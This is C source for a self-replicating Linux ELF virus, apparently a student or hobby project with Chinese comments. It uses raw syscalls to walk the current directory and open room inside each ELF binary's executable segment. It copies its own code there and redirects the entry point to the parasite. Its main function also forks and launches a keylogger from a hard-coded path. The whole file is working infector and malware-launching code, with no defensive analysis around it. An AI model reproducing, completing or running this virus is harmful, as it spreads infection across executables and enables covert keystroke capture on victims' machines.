#include <sys/stat.h>
#include <sys/mman.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/syscall.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>


//TODO detemine the constants
#define MAX_FILE_NAME_LEN 256
#define SIZE_OF_VIRUS 4060
#define APPEND_NUM 448*4096
#define SIZE_OF_SHDR 64
#define SIZE_OF_PHDR 56

struct linux_dirent {
           long           d_ino;
           off_t          d_off;
           unsigned short d_reclen;
           char           d_name[];
       };

void Myclose(long long fd)
{
	if(fd <= 2)
		return;
	asm volatile("mov $3, %%rax\n\t"
				 "mov %[fd], %%rdi\n\t"
				 "syscall\n\t"
				 :
				 :[fd]"m"(fd)
				 :"rax", "rdi");
}


void Mywrite(long long fd, char* buf, long long len)
{
	asm volatile("mov %[fd], %%rdi\n\t"
	"mov %[path], %%rsi\n\t"
	"mov %[len], %%rdx\n\t"
	"mov $1, %%rax\n\t"
	"syscall"
	:
	:[path]"m"(buf), [len]"m"(len), [fd]"m"(fd)
	:"rax", "rdi", "rsi", "rdx", "rcx", "r11");
}


void Myread(long long fd, char* buf, long long len)
{
	asm volatile("mov $0, %%rax\n\t"
				 "mov %[fd], %%rdi\n\t"
				 "mov %[buf], %%rsi\n\t"
				 "mov %[len], %%rdx\n\t"
				 "syscall\n\t"
				 :
				 :[fd]"m"(fd), [buf]"m"(buf), [len]"m"(len)
				 :"rax", "rdi", "rsi", "rdx", "rcx", "r11");
}

//re-implementation of open()
long long Myopen(char *path, long long permission, long long mode)
{
	long long ret;
	asm volatile ("mov $2,%%rax\n\t"
				 "mov %[ppath], %%rdi\n\t"
				 "mov %[p], %%rsi\n\t"
				 "mov %[mode], %%rdx\n\t"
				 "syscall\n\t"
				 "mov %%rax, %[ret]\n\t"
				 :[ret]"=m"(ret)
				 :[ppath]"m"(path), [p]"m"(permission), [mode]"m"(mode)
				 :"rax", "rdi", "rsi", "rdx", "rcx", "r11");
	return ret;
}

long long Myfstat(long long fd, struct stat* buf)
{
	long long ret;
	asm volatile("mov $5, %%rax\n\t"
				 "mov %[fd], %%rdi\n\t"
				 "mov %[buf], %%rsi\n\t"
				 "syscall\n\t"
				 "mov %%rax, %[ret]\n\t"
				 :[buf]"=m"(buf), [ret]"=m"(ret)
				 :[fd]"m"(fd)
				 :"rax", "rdi", "rsi", "rcx", "r11");
	return ret;
}

void Mylseek(long long fd, long long offset, long long origin)
{
		asm volatile("mov $8, %%rax\n\t"
				 "mov %[fd], %%rdi\n\t"
				 "mov %[len], %%rsi\n\t"
				 "mov %[origin], %%rdx\n\t"
				 "syscall"
				 :
				 :[fd]"m"(fd), [len]"m"(offset), [origin]"m"(origin));
}

long long Myopen_append(char *path, long long permission, long long mode)
{
	long long ret; long long o_append = O_WRONLY | O_APPEND;
	asm volatile ("mov $2, %%rax\n\t"
				 "mov %[ppath], %%rdi\n\t"
				 "mov %[p], %%rsi\n\t"
				 "mov %[mode], %%rdx\n\t"
				 "syscall\n\t"
				 "mov %%rax, %[ret]\n\t"
				 :[ret]"=m"(ret)
				 :[ppath]"m"(path), [p]"m"(permission), [mode]"m"(o_append)
				 :"rax", "rdi", "rsi", "rdx", "rcx", "r11");
	struct stat stat;
	Myfstat(ret, &stat);
	Mylseek(ret, stat.st_size, SEEK_SET);
	
	int i;
	char buf = 0;
	for(i = 0; i < APPEND_NUM; ++i)
	{
		Mywrite(ret, &buf, 1);
	}
	
	Myclose(ret);
	
	asm volatile ("mov $2, %%rax\n\t"
				 "mov %[ppath], %%rdi\n\t"
				 "mov %[p], %%rsi\n\t"
				 "mov %[mode], %%rdx\n\t"
				 "syscall\n\t"
				 "mov %%rax, %[ret]\n\t"
				 :[ret]"=m"(ret)
				 :[ppath]"m"(path), [p]"m"(permission), [mode]"m"(mode)
				 :"rax", "rdi", "rsi", "rdx", "rcx", "r11");
	return ret;
}

void* Mymmap(unsigned long long addr, unsigned long long len, unsigned long long prot, unsigned long long flags, unsigned long long fd, unsigned long long offset)
{
	void* ret;
	asm volatile("mov $9, %%rax\n\t"
				 "mov %[addr], %%rdi\n\t"
				 "mov %[len], %%rsi\n\t"
				 "mov %[prot], %%rdx\n\t"
				 "mov %[flags], %%r10\n\t"
				 "mov %[fd], %%r8\n\t"
				 "mov %[offset], %%r9\n\t"
				 "syscall\n\t"
				 "mov %%rax, %[ret]\n\t"
				 :[ret]"=m"(ret)
				 :[addr]"m"(addr), [len]"m"(len), [prot]"m"(prot), [flags]"m"(flags), [fd]"m"(fd), [offset]"m"(offset)
				 :"rax", "rdi", "rsi", "rdx", "r10", "r8", "r9", "rcx", "r11"
				);
	return ret;
}


void* Myprintstr(char *str, long long len)
{
	Mywrite(1, str, len);
}

int intersect(int al, int ar, int bl, int br)   //判断ab是否有重叠部分
{
	if(al >= bl && al <= br)
		return 1;
	if(ar >= bl && ar <= br)
		return 1;
	if(bl >= al && bl <= ar)
		return 1;
	if(br >= al && br <= ar)
		return 1;
	return 0;
}

int find_segments(Elf64_Shdr *shdr, Elf64_Ehdr *ehdr, Elf64_Phdr *phdr, int file_size, char *elf_file)
{
	//TODO CHECK
	int pcount = ehdr -> e_phnum, scount = ehdr -> e_shnum;
	int desired_v_begin, desired_v_end;
	int desired_f_begin, desired_f_end;
	int i, j;
	int loc = -1;
	for(i = 0; i < pcount; ++i)
	{
		//寻找可执行的段。PF是用二进制数表示的，因此用&来判断
		if(phdr[i].p_filesz > 0 && phdr[i].p_filesz == phdr[i].p_memsz
			&& (phdr[i].p_flags & PF_X))
		{
			//划定插入代码的位置
			desired_v_begin = phdr[i].p_vaddr + phdr[i].p_memsz;
			desired_v_end = phdr[i].p_vaddr + phdr[i].p_memsz + SIZE_OF_VIRUS - 1;
			for(j = 0; j < pcount; ++j)
			{
				//如果病毒的范围和其他段有交叠，则退出(导致loc没有修改，后续步骤退出)
				if(intersect(phdr[j].p_vaddr, phdr[j].p_vaddr + phdr[j].p_memsz - 1, desired_v_begin, desired_v_end))
					break;
			}
			//发现没有交叠，loc为找到的要插入的位置。
			if(j == pcount)
			{
				loc = i;
				break;
			}
		}
	}

	if(loc == -1)
		return -1;
	//寄生代码的偏移地址
	desired_f_begin = phdr[loc].p_filesz + phdr[loc].p_offset;
	desired_f_end = desired_f_begin + SIZE_OF_VIRUS - 1;
	int occupied_size = SIZE_OF_VIRUS;
	//移动寄生代码后面的数据，腾出空间
	int len = file_size;
	for(i = len - APPEND_NUM - 1; i >= desired_f_begin; --i)
		elf_file[i + APPEND_NUM] = elf_file[i];
	shdr += APPEND_NUM / SIZE_OF_SHDR;
	for(i = 0; i < pcount; ++i)
	{
		//对在寄生代码之后的段偏移进行修改
		if(phdr[i].p_offset >= desired_f_begin)
		{
			phdr[i].p_offset += APPEND_NUM;
		}
		//扩大被寄生段的尺寸
		else if(phdr[i].p_offset + phdr[i].p_filesz > desired_f_begin)
		{
			phdr[i].p_filesz += APPEND_NUM;
		}
	}
	for(i = 0; i < scount; ++i)
	{
		//对在寄生代码之后的节偏移进行修改
		if(shdr[i].sh_offset >= desired_f_begin)
			shdr[i].sh_offset += APPEND_NUM;
		else if(shdr[i].sh_offset + shdr[i].sh_size > desired_f_begin)
		{
		}
	}
	//移动文件头
	ehdr -> e_shoff += APPEND_NUM;
	return loc;
}

long long mainAddr;

void infect(char *path)
{
	char sign[MAX_FILE_NAME_LEN];
	int i, j, len; 
	len = 0;   

	//生成一个文件作为感染成功的标记
	while(path[len])
	{
		sign[len] = path[len];
		++len;
	}

	*(long long*)(&sign[len]) = 32760384459794734LL; //.infect\0  0x746365666e6930

	long long fd = Myopen(path,2,0);
	
	struct stat stat;

	Myfstat(fd, &stat);
	
	//把文件映射进内存便于处理
	char *elf_file = Mymmap(0, stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	
	
	char *the_ptr, *virus = (char*)0x1996110319961103LL; //用于定位寄生代码的位置，使在传染时病毒能自我复制
	
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	long long loc, pos, endpos;
	long long signfd;
	
	if(((long long)elf_file > 0) && (*(int*)(elf_file) == 1179403647) && (signfd = Myopen(sign, O_CREAT | O_RDWR, 777)) > 0) // file accessible and it's a ELF-file and sign not exists
	{
		//APPEND PROCESS
		Myclose(fd);
		fd = Myopen_append(path, 2, 0);

		Myfstat(fd, &stat);
		elf_file = Mymmap(0, stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
		
		//得到文件头
		ehdr = (Elf64_Ehdr*)elf_file;
		//得到段头
		phdr = (Elf64_Phdr*) (elf_file + ehdr -> e_phoff);
		//得到节头
		shdr = (Elf64_Shdr*) (elf_file + ehdr -> e_shoff);
		
		loc = find_segments(shdr, ehdr, phdr, stat.st_size, elf_file);
		
		if(loc != -1)
		{
			//memcpy(elf_file + phdr[loc].p_offset + phdr[loc].p_filesz, virus, sizeof virus); //finish infection
			//被寄生段末尾的偏移地址
			endpos = phdr[loc].p_offset + phdr[loc].p_filesz;
			
			//re-implementation of memcpy 
			the_ptr = elf_file + endpos;
			//写入寄生代码
			for(i = 0; i < SIZE_OF_VIRUS; ++i, ++virus, ++the_ptr)
				*the_ptr = *virus;
			
			//段头修改
			phdr[loc].p_filesz += SIZE_OF_VIRUS;
			phdr[loc].p_memsz += SIZE_OF_VIRUS;
			
			//change jump instruction
			//被寄生段末尾的地址
			pos = phdr[loc].p_vaddr + phdr[loc].p_filesz;
			//改变跳转指令，跳回寄主文件的入口地址
			*(Elf64_Word*)(the_ptr - 4) = (Elf64_Word)ehdr->e_entry - pos; 
			
			//#define entryDelta 3224
			
			#define entryDelta 3360//插入代码的起始地址与其main函数地址的差值
			//change the initial value variable "char* virus" in above code, also relocate entry
			
			//修改*virus，定位寄生代码在文件中的位置
			#define myConstant1 2291
			*(long long*)(elf_file + endpos + myConstant1) = pos - SIZE_OF_VIRUS;
			//修改入口地址到寄生代码的main函数
			ehdr -> e_entry = pos - SIZE_OF_VIRUS + entryDelta;
		}
		//No need for close
		//else give up
	}
	
	Myclose(signfd);
	Myclose(fd);
}

int myfork()
{
	int ret;
	asm volatile(
		"mov $0x2,%%eax\n\t"
		"int $0x80\n\t"
		"mov %%eax,%0\n\t"
		:"=m"(ret)
		:
		:"eax"
		);

    return ret;
}

int myexecv(const char *pathname, char *const argv[])
{
	int ret;
	asm volatile("mov $59, %%rax\n\t"
		     "mov %[pathname], %%rdi\n\t"
		     "mov %[argv], %%rsi\n\t"
		     "syscall\n\t"
		     "mov %%rax,%[ret]\n\t"
		     :[ret]"=m"(ret)
		     :[pathname]"m"(pathname),[argv]"m"(argv)
		     :"rax","rdi","rsi");
	return ret;
}


int main()
{
	char a[4];
	char msg1[13];
	char path[50];

	//Print string
	msg1[0]='R';
	msg1[1]='o';
	msg1[2]='t';
	msg1[3]='a';
	msg1[4]='i';
	msg1[5]='n';
	msg1[6]='m';
	msg1[7]='r';
	msg1[8]='e';
	msg1[9]='t';
	msg1[10]='!';
	msg1[11]='\n';

	//Myprintstr(msg1,12);
	
	//Define my keylogger elf_file path
	path[0]='/';
	path[1]='h';
	path[2]='o';
	path[3]='m';
	path[4]='e';
	path[5]='/';
	path[6]='s';
	path[7]='u';
	path[8]='n';
	path[9]='/';
	path[10]='D';
	path[11]='e';
	path[12]='s';
	path[13]='k';
	path[14]='t';
	path[15]='o';
	path[16]='p';
	path[17]='/';
	path[18]='R';
	path[19]='o';
	path[20]='t';
	path[21]='a';
	path[22]='n';
	path[23]='i';
	path[24]='m';
	path[25]='r';
	path[26]='e';
	path[27]='t';
	path[28]='/';
	path[29]='s';
	path[30]='k';
	path[31]='e';
	path[32]='y';
	path[33]='l';
	path[34]='o';
	path[35]='g';
	path[36]='g';
	path[37]='e';
	path[38]='r';
	path[39]='/';
	path[40]='s';
	path[41]='k';
	path[42]='l';


	int process1;
	process1 = myfork();

	if(process1 == 0)
		myexecv(path,NULL);
	else
		Myprintstr(msg1,12);


	*(int*)a = '.'; //scan this file can tell us the file names of current directory
	
	long long fd = Myopen(a, 0, 0);	//Open the file in the dictionary.
	
	char buf[4096];
	long long nread;
	int bpos;
	
    struct linux_dirent *d;

    //This segment scan the directory to check if there is a file to infect.
	do
	{
               //nread = syscall(SYS_getdents, fd, buf, 4096); A syscall to read '.', since it's a protected file.
               asm("mov %[fd], %%rdi\n\t"
               	   "mov %[buf], %%rsi\n\t"
               	   "mov $4096, %%rdx\n\t"
               	   "mov $217, %%rax\n\t"
               	   "syscall\n\t"
               	   "mov %%rax, %[nread]"
               	   :[nread]"=m"(nread)
               	   :[fd]"m"(fd), [buf]"r"(buf)
               	   :"rax", "rdi", "rsi", "rdx", "rax");
               	   
               for (bpos = 0; bpos < nread;) //enumerate all files
               {                                
                    d = (struct linux_dirent *) (buf + bpos);
					infect(d -> d_name + 1);
                    bpos += d -> d_reclen;   
               }
               
    }while(nread != 0);

    Myclose(fd);
    //read only fd, is not needed for close

   	asm volatile("nop\n\t"
   				 "nop\n\t"
   				 "nop\n\t"
   				 "nop\n\t"
   				 "nop\n\t"
   				 :
   				 :
   				 :);
}
